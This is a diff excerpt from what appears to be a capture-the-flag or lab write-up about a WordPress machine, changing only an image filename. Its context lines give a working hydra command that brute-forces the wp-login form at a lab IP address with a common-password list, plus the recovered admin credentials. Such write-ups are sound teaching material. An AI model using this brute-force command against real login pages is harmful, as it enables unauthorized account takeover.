@@ -29,7 +29,7 @@
 	- `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt 10.10.104.139 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -v`
 	- As you may have noticed instead of `rockyou.txt` list we are using `2023-200_most_used_passwords.txt`, this is because the `rockyou.txt` is massive and will take a lot time so i always prefer to start with smaller lists first.
 	
-	![Hydra Success](Assets/Pasted%20image%2020250501082753.png)
+	![Hydra Success](Assets/hydra-success.png)
 
 - And within couple of minutes we have our credentials which we will be using to login the admin panel.
 - Credentials: admin:theworldinyourhand
